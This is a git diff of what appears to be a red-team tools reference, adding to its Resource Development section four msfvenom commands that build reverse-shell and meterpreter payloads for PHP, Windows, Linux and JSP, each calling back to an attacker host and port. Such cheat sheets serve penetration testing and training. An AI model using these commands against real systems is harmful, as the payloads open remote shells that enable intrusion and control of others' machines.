@@ -97,6 +97,14 @@ Resource Development
 
 	Msfvenom allows the creation of payloads for various operating systems in a wide range of formats. It also supports obfuscation of payloads for AV bypass.
 	
+	**PHP:** `msfvenom -p php/meterpreter/reverse_tcp lhost =192.168.0.9 lport=1234 R`
+	
+	**Windows:** `msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe`
+	
+	**Linux:** `msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf`
+	
+	**Java:** `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp`
+	
 	![image](https://user-images.githubusercontent.com/100603074/192070870-2e65fc9f-6534-42e2-af27-9d8b54a82f0b.png)
 
 
@@ -120,8 +128,6 @@ Initial Access
 	Nice tool for logon brute force attacks. Can bf a number of services including SSH, FTP, TELNET, HTTP etc.
 
 	![image](https://user-images.githubusercontent.com/100603074/193459614-365876d5-09da-4f29-b850-0480944f0097.png)
-
-
 
 Privilege Escalation
 ====================
